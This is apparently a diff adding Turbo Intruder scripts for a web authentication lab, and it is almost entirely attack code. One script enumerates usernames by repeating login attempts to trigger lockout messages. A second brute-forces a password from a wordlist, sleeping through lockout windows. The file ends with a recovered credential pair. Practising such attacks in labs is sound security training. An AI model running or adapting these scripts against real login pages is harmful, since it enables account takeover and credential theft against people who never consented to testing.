@@ -1,0 +1,51 @@
+POST /login HTTP/1.1
+
+username=%s&password=aaaaa
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for word in open('/tmp/auth-lab-usernames'):
+      for i in range(5):
+        engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if "Invalid username or password." not in req.response:
+        table.add(req)
+
+
+POST /login HTTP/1.1
+
+username=access&password=%s
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for word in open('/tmp/auth-lab-passwords'):
+      engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in req.response:
+      table.add(req)
+      time.sleep(60)
+    elif "Invalid username or password." not in req.response:
+      table.add(req)
+
+
+POST /login HTTP/1.1
+
+username=access&password=harvey
